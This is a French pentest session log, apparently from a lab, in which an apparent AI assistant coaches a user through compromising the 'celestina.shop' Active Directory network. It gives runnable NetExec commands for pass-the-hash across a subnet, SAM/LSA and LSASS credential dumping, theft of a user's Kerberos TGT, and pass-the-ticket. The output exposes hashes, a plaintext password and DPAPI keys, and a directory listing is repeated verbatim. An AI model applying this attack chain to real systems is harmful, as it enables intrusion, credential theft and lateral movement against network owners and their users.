SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:WK-124) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:DC-CELESTINA) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:WK-123) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:WK-155) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:WK-101) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:WK-111) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:WK-137) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:WK-132) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:WK-222) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:WK-234) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:WK-202) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [-] WK-044\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.10     445    WK-010           [-] WK-010\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.30     445    WK-030           [-] WK-030\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.20     445    WK-020           [-] WK-020\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.124    445    WK-124           [+] WK-124\Administrator:fafb12f22417628bb6422e9bb8686f5c (admin)

SMB         10.13.37.42     445    DC-CELESTINA     [-] DC-CELESTINA\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.123    445    WK-123           [+] WK-123\Administrator:fafb12f22417628bb6422e9bb8686f5c (admin)

SMB         10.13.37.101    445    WK-101           [-] WK-101\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.155    445    WK-155           [-] WK-155\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.111    445    WK-111           [-] WK-111\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.137    445    WK-137           [-] WK-137\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.132    445    WK-132           [-] WK-132\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.222    445    WK-222           [-] WK-222\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.234    445    WK-234           [-] WK-234\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

SMB         10.13.37.202    445    WK-202           [-] WK-202\Administrator:fafb12f22417628bb6422e9bb8686f5c STATUS_LOGON_FAILURE 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

Superbe ! L'attaque Pass-the-Hash a fonctionné à merveille. C'est exactement pour ça qu'il est déconseillé d'avoir le même mot de passe d'administrateur local partout (ce qu'on appelle un manque de ségrégation LAPS/LAPS).

Regarde attentivement cette ligne dans tes résultats :
[+] WK-124\Administrator:fafb12f22417628bb6422e9bb8686f5c (admin)

Nous sommes maintenant Administrateur Local de la machine WK-124 (10.13.37.124).

On croise les doigts : c'est le moment de vérifier si c'est enfin notre fameuse machine passerelle (pivot) vers le réseau secret !

Lance cette commande pour exécuter un ipconfig spécifiquement sur cette nouvelle machine en utilisant notre hash :

Bash
nxc smb 10.13.37.124 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -x 'ipconfig'
Dis-moi vite ce que ça donne. Vois-tu enfin une carte réseau configurée sur la plage 10.37.13.X ?

[May 18, 2026 - 10:45:25 (CEST)] exegol-free /workspace # nxc smb 10.13.37.124 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -x 'ipconfig'

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:WK-124) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [+] WK-124\Administrator:fafb12f22417628bb6422e9bb8686f5c (admin)

SMB         10.13.37.124    445    WK-124           [+] Executed command via wmiexec

SMB         10.13.37.124    445    WK-124           Windows IP Configuration

SMB         10.13.37.124    445    WK-124           Ethernet adapter Ethernet0 2:

SMB         10.13.37.124    445    WK-124              Connection-specific DNS Suffix  . :

SMB         10.13.37.124    445    WK-124              Link-local IPv6 Address . . . . . : fe80::965e:b14:2ff4:96b%5

SMB         10.13.37.124    445    WK-124              IPv4 Address. . . . . . . . . . . : 10.13.37.124

SMB         10.13.37.124    445    WK-124              Subnet Mask . . . . . . . . . . . : 255.255.255.0

SMB         10.13.37.124    445    WK-124              Default Gateway . . . . . . . . . : 10.13.37.1

Encore un faux espoir ! L'outil nous confirme que WK-124 n'a qu'une seule carte réseau (10.13.37.124). Ce n'est donc toujours pas notre passerelle (pivot) vers le réseau caché 10.37.13.0/24.

Cependant, tu viens de compromettre une nouvelle machine. Et en pentest, la règle d'or est stricte : Nouvelle machine compromise = Nouveau pillage de mémoire !

Il est fort possible qu'un autre administrateur, un compte de service privilégié, ou même un utilisateur clé se soit connecté sur WK-124 récemment, laissant ses identifiants dans la mémoire locale (LSASS).

On va répéter exactement la même opération de "Credential Dumping", mais cette fois-ci sur WK-124, en utilisant notre accès d'Administrateur Local (via le hash).

Lance ces deux commandes l'une après l'autre :

1. Vider la base SAM de WK-124 :

Bash
nxc smb 10.13.37.124 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth --sam
2. Vider les secrets LSA de WK-124 :

Bash
nxc smb 10.13.37.124 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth --lsa
Quelles nouvelles informations ou identifiants croustillants trouves-tu dans ces nouveaux dumps ?

[May 18, 2026 - 10:45:56 (CEST)] exegol-free /workspace # nxc smb 10.13.37.124 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth --sam

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:WK-124) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [+] WK-124\Administrator:fafb12f22417628bb6422e9bb8686f5c (admin)

SMB         10.13.37.124    445    WK-124           [*] Dumping SAM hashes

SMB         10.13.37.124    445    WK-124           Administrator:500:aad3b435b51404eeaad3b435b51404ee:fafb12f22417628bb6422e9bb8686f5c:::

SMB         10.13.37.124    445    WK-124           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB         10.13.37.124    445    WK-124           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB         10.13.37.124    445    WK-124           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:226e3799ac9c5359a8e1a6043278c383:::

SMB         10.13.37.124    445    WK-124           s.kuwel:1001:aad3b435b51404eeaad3b435b51404ee:04965c09bc5c0ef6bd88356a6caf7923:::

SMB         10.13.37.124    445    WK-124           [+] Added 5 SAM hashes to the database

[May 18, 2026 - 10:46:32 (CEST)] exegol-free /workspace # nxc smb 10.13.37.124 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth --lsa

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:WK-124) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [+] WK-124\Administrator:fafb12f22417628bb6422e9bb8686f5c (admin)

SMB         10.13.37.124    445    WK-124           [*] Dumping LSA secrets

SMB         10.13.37.124    445    WK-124           CELESTINA\WK-124$:aes256-cts-hmac-sha1-96:b8213b20b39588b462aedc9f1f1b55fda7681397f881dc33afe47eb294a70bfb

SMB         10.13.37.124    445    WK-124           CELESTINA\WK-124$:aes128-cts-hmac-sha1-96:3412ccbf657c5ca58c773ff4d6e8f85b

SMB         10.13.37.124    445    WK-124           CELESTINA\WK-124$:des-cbc-md5:cd895def25526473

SMB         10.13.37.124    445    WK-124           CELESTINA\WK-124$:plain_password_hex:ca4e596288a60672c2e2152f668bbd4dd36a87b7f1eebd91a2ad020b07d8c185696062afd9c237d79ea579a5b1346f32a1e9f97c406e316ad10da3a06714821d9f02381a87f485d58e0ef6a8ecc7e4bbbc7c438e8562f1f431e184b4e6f06760ccf10a957882d1a4634df78d24e3829a8072e2fb9912b0b308352f6af7babe520d97819ace57fa3b85d0215cab8b57d82adaaf2fabe305c7e937a4056955a83db79a4dad68ea6acb8470a61c4ece8bc1a7b3472b19d1040161224caf5cf8f41c7985e17f967e2db8073eb8639090c52740a8da49efdcca84b3052785540d7882f6c5ee10d2d449f4ff85a3e9b7358a63

SMB         10.13.37.124    445    WK-124           CELESTINA\WK-124$:aad3b435b51404eeaad3b435b51404ee:81faabbcd0cc52a4a2ac8301f611a0af:::

SMB         10.13.37.124    445    WK-124           dpapi_machinekey:0x805f8992d6f3de5fad996abbbed38e56f47f4f6d

dpapi_userkey:0xb952203485c2a35819636fadd8f1698b3592ccf8

Can't open SECURITY\Policy\Secrets\DSREGCMD\CurrVal subKey

SMB         10.13.37.124    445    WK-124           [+] Dumped 6 LSA secrets to /root/.nxc/logs/lsa/WK-124_10.13.37.124_2026-05-18_104638.secrets and /root/.nxc/logs/lsa/WK-124_10.13.37.124_2026-05-18_104638.cached

Parfait. Tu as récupéré le hash d'un nouvel utilisateur local : s.kuwel :
s.kuwel:1001:aad3b435b51404eeaad3b435b51404ee:04965c09bc5c0ef6bd88356a6caf7923:::

La Stratégie du "Pass-The-Hash" (Encore)
On va relancer exactement la même attaque que tout à l'heure, mais avec ce nouveau hash. L'objectif est toujours le même : trouver sur quelle autre machine cet utilisateur a des droits d'administration.

Puisque nous savons déjà qu'il vient de WK-124, nous allons exclure cette machine de notre scan pour gagner du temps et vérifier les autres.

Lance cette commande :

Bash
nxc smb 10.13.37.0/24 -u 's.kuwel' -H '04965c09bc5c0ef6bd88356a6caf7923' --local-auth
Dès qu'une machine te renvoie un [+] avec la mention (admin), tu sauras quoi faire : relancer la commande avec le paramètre -x 'ipconfig' sur cette machine spécifique pour voir si c'est enfin notre fameux pivot vers le réseau 10.37.13.0/24 !

[May 18, 2026 - 10:46:44 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 's.kuwel' -H '04965c09bc5c0ef6bd88356a6caf7923' --local-auth

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:DC-CELESTINA) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:WK-124) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:WK-010) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:WK-137) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:WK-155) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:WK-101) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:WK-044) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:WK-132) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:WK-030) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:WK-202) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:WK-020) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:WK-111) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:WK-123) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:WK-234) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:WK-222) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [-] DC-CELESTINA\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.124    445    WK-124           [-] WK-124\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_PASSWORD_EXPIRED 

SMB         10.13.37.10     445    WK-010           [-] WK-010\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.137    445    WK-137           [-] WK-137\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.155    445    WK-155           [-] WK-155\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.101    445    WK-101           [-] WK-101\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.44     445    WK-044           [-] WK-044\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.132    445    WK-132           [-] WK-132\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.30     445    WK-030           [-] WK-030\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.20     445    WK-020           [-] WK-020\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.202    445    WK-202           [-] WK-202\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.111    445    WK-111           [-] WK-111\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.123    445    WK-123           [-] WK-123\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.234    445    WK-234           [-] WK-234\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

SMB         10.13.37.222    445    WK-222           [-] WK-222\s.kuwel:04965c09bc5c0ef6bd88356a6caf7923 STATUS_LOGON_FAILURE 

C'est un cul-de-sac classique en pentest ! Les logs sont clairs : le compte s.kuwel est un compte local qui n'existe que sur WK-124, et pour couronner le tout, son mot de passe a expiré (STATUS_PASSWORD_EXPIRED). On l'oublie, il ne nous servira à rien.

Cependant, nous avons encore une carte maîtresse à jouer sur nos deux machines compromises (WK-123 et WK-124).

Jusqu'à présent, nous avons extrait les secrets stockés "à froid" sur le disque dur (les bases SAM et LSA). Mais Windows met aussi en cache les identifiants des utilisateurs actifs dans sa mémoire vive (RAM), plus précisément dans le processus LSASS. L'intégration d'une sécurité robuste autour de ces processus mémoire est d'ailleurs une vraie problématique d'architecture lorsqu'on conçoit des environnements orientés DevSecOps !

On va demander à NetExec d'injecter un module appelé lsassy pour aller lire cette mémoire et espérer y trouver le mot de passe en clair d'un administrateur du domaine ou d'un compte de support IT qui se serait connecté récemment sur ces postes.

Lance ces deux commandes pour vider la mémoire RAM de nos deux cibles :

Sur WK-123 (via notre accès a.nozer) :

Bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -M lsassy
Sur WK-124 (via notre accès Administrateur Local et son hash) :

Bash
nxc smb 10.13.37.124 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -M lsassy
Observe attentivement les résultats de lsassy. Est-ce qu'un nouveau nom d'utilisateur de la société CELESTINA (et son mot de passe en clair !) remonte des entrailles de la mémoire ?

[May 18, 2026 - 10:47:34 (CEST)] exegol-free /workspace # nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -M lsassy

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\a.nozer:C3L3stin4!Us3r (admin)

LSASSY      10.13.37.123    445    WK-123           Saved 22 Kerberos ticket(s) to /root/.nxc/modules/lsassy

LSASSY      10.13.37.123    445    WK-123           [*] No credentials found

[May 18, 2026 - 10:48:42 (CEST)] exegol-free /workspace # nxc smb 10.13.37.124 -u 'Administrator' -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -M lsassy

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:WK-124) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [+] WK-124\Administrator:fafb12f22417628bb6422e9bb8686f5c (admin)

LSASSY      10.13.37.124    445    WK-124           [-] Unable to dump lsass

C'est ce qu'on appelle les montagnes russes du pentest !

Analyse rapide de ce qui vient de se passer :

Sur WK-124 : Windows a bloqué l'attaque (Unable to dump lsass). C'est très courant sur les systèmes récents, l'antivirus (Defender) ou une protection spécifique (RunAsPPL) empêche de lire la mémoire.

Sur WK-123 : Pas de mots de passe en clair trouvés... MAIS regarde cette ligne incroyable : Saved 22 Kerberos ticket(s) !

C'est une véritable mine d'or. Au lieu de récupérer un mot de passe, lsassy a volé les tickets d'authentification Kerberos des utilisateurs récents. Si un Administrateur du Domaine (ou un compte très privilégié) s'est connecté sur cette machine récemment, son ticket est dans ce lot. Et avec un ticket, on n'a même pas besoin de son mot de passe : on peut usurper son identité directement ! C'est la fameuse attaque du Pass-The-Ticket (PtT).

Étape 1 : Fouiller le butin
Allons voir à qui appartiennent ces tickets volés. NetExec les a sauvegardés dans un dossier spécifique.

Lance cette commande pour lister les tickets obtenus :

Bash
ls -lh /root/.nxc/modules/lsassy/
(Si le dossier exact est légèrement différent selon ta version d'Exegol, tu peux aussi chercher globalement avec : find /root/.nxc/ -name "*.kirbi" | grep lsassy)

Regarde les noms des fichiers. Généralement, ils sont nommés sous la forme [domaine]_[utilisateur]_[service].kirbi.

Cherche le gros lot : vois-tu un ticket appartenant à l'utilisateur Administrator (du domaine Celestina), ou à un autre nom d'utilisateur qui te semble être un administrateur global ? Dis-moi quels sont les noms les plus intéressants dans cette liste !

[May 18, 2026 - 10:49:33 (CEST)] exegol-free /workspace # ls -lh /root/.nxc/modules/lsassy/

total 88K

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_cifs_dc-celestina.celestina.shop_celestina.shop_183766aa_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_cifs_dc-celestina.celestina.shop_e181ed02_10.13.37.123_20260518125141.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_GC_dc-celestina.celestina.shop_celestina.shop_f8f1cb56_10.13.37.123_20260518032141.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_LDAP_dc-celestina.celestina.shop_b6fe17d3_10.13.37.123_20260518032141.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_ldap_dc-celestina.celestina.shop_celestina.shop_1d040ebb_10.13.37.123_20260518032141.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_LDAP_dc-celestina.celestina.shop_celestina.shop_f34d6466_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_WK-123$_56a8d366_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_0f882254_10.13.37.123_20260518184824.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_10a3eb60_10.13.37.123_20260518184624.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_2f50e6b2_10.13.37.123_20260518183824.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_398c5696_10.13.37.123_20260518183924.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_425805a2_10.13.37.123_20260518184224.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_5780deca_10.13.37.123_20260518184724.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_6dc08a26_10.13.37.123_20260518184424.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_8f93cd77_10.13.37.123_20260518184024.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_96020ae7_10.13.37.123_20260518184124.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_9c9e8540_10.13.37.123_20260518184324.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_9cfcc63c_10.13.37.123_20260518184524.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48 'TGT_CELESTINA.SHOP_WK-123$_krbtgt_CELESTINA.SHOP_408b9f35_10.13.37.123_20260518125141.ccache'

-rw-rw---- 1 root root 1.4K May 18 10:48 'TGT_CELESTINA.SHOP_WK-123$_krbtgt_CELESTINA.SHOP_6a3e2d66_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.4K May 18 10:48 'TGT_CELESTINA.SHOP_WK-123$_krbtgt_CELESTINA.SHOP_a079a267_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.4K May 18 10:48 'TGT_CELESTINA.SHOP_WK-123$_krbtgt_CELESTINA.SHOP_cd73aa6b_10.13.37.123_20260518125141.ccache'

Excellent ! C'est ce qu'on appelle un beau tableau de chasse.

Si on analyse la liste des fichiers, on voit deux types de tickets Kerberos (extension .ccache) :

Des tickets machine (WK-123$) : Ce sont les tickets que l'ordinateur lui-même utilise pour parler au Contrôleur de Domaine. Pas très utile pour nous.

Des tickets utilisateurs TGT (TGT_CELESTINA.SHOP_k.udele...) : C'est ça le gros lot !

L'utilisateur k.udele s'est récemment connecté sur WK-123. Et lsassy a volé son Ticket Granting Ticket (TGT). Un TGT, dans le monde Kerberos, c'est comme un badge VIP universel : si tu le possèdes, le réseau croit que tu es k.udele, sans même que tu aies besoin de connaître son mot de passe !

Comment utiliser ce ticket (Pass-The-Ticket)
Pour utiliser ce ticket volé, il faut l'importer dans la mémoire de ton terminal Exegol. Sous Linux, cela se fait très simplement en définissant une variable d'environnement nommée KRB5CCNAME.

Étape 1 : Exporte le ticket dans ton terminal
Copie la commande ci-dessous (j'ai pris le premier ticket de k.udele de ta liste, n'importe lequel fonctionne) :

Bash
export KRB5CCNAME="/root/.nxc/modules/lsassy/TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_0f882254_10.13.37.123_20260518184824.ccache"
Étape 2 : Vérifie que le ticket est bien chargé
Lance la commande :

Bash
klist
Si ton terminal affiche les infos du ticket de k.udele, tu as officiellement usurpé son identité !

L'attaque finale pour le Pivot
Maintenant que tu es k.udele aux yeux de l'Active Directory, on va réutiliser NetExec sur tout le réseau pour voir si ce compte possède des droits d'administration sur une autre machine (notamment notre fameuse passerelle vers le réseau secret).

Attention à la syntaxe : Quand on utilise un ticket Kerberos, on remplace le mot de passe -p par le flag -k et on DOIT utiliser les noms de domaine complets (FQDN), pas les adresses IP.

Lance cette commande de scan global avec ton nouveau badge VIP :

Bash
nxc smb 10.13.37.0/24 -u 'k.udele' -k -d celestina.shop
Si tu obtiens un (Pwn3d!) sur une nouvelle machine (comme WK-XXX), relance vite cette commande précise sur cette machine en ajoutant -x 'ipconfig' ! On y est presque !

[May 18, 2026 - 10:49:33 (CEST)] exegol-free /workspace # ls -lh /root/.nxc/modules/lsassy/

total 88K

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_cifs_dc-celestina.celestina.shop_celestina.shop_183766aa_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_cifs_dc-celestina.celestina.shop_e181ed02_10.13.37.123_20260518125141.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_GC_dc-celestina.celestina.shop_celestina.shop_f8f1cb56_10.13.37.123_20260518032141.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_LDAP_dc-celestina.celestina.shop_b6fe17d3_10.13.37.123_20260518032141.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_ldap_dc-celestina.celestina.shop_celestina.shop_1d040ebb_10.13.37.123_20260518032141.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_LDAP_dc-celestina.celestina.shop_celestina.shop_f34d6466_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.5K May 18 10:48 'TGS_CELESTINA.SHOP_WK-123$_WK-123$_56a8d366_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_0f882254_10.13.37.123_20260518184824.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_10a3eb60_10.13.37.123_20260518184624.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_2f50e6b2_10.13.37.123_20260518183824.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_398c5696_10.13.37.123_20260518183924.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_425805a2_10.13.37.123_20260518184224.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_5780deca_10.13.37.123_20260518184724.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_6dc08a26_10.13.37.123_20260518184424.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_8f93cd77_10.13.37.123_20260518184024.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_96020ae7_10.13.37.123_20260518184124.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_9c9e8540_10.13.37.123_20260518184324.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48  TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_9cfcc63c_10.13.37.123_20260518184524.ccache

-rw-rw---- 1 root root 1.4K May 18 10:48 'TGT_CELESTINA.SHOP_WK-123$_krbtgt_CELESTINA.SHOP_408b9f35_10.13.37.123_20260518125141.ccache'

-rw-rw---- 1 root root 1.4K May 18 10:48 'TGT_CELESTINA.SHOP_WK-123$_krbtgt_CELESTINA.SHOP_6a3e2d66_10.13.37.123_20260518130640.ccache'

-rw-rw---- 1 root root 1.4K May 18 10:48 'TGT_CELESTINA.SHOP_WK-123$_krbtgt_CELESTINA.SHOP_a079a267_10.13.37.123_20260518130640.ccache'

